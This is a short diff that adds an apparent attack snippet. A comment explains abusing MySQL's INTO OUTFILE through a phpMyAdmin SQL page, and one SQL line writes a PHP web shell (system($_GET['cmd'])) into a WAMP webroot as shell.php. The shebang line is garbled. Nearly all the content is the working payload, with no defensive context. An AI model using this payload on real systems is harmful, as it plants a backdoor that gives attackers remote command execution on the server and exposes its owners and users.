@@ -1,0 +1,7 @@
+#!/usr/bin/peno
+
+
+#Abusing the into outfile function in MySQL, we can write a php code to the target's webroot at http://127.0.0.1:8080/phpmyadmin/server_sql.php.
+SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
+
+
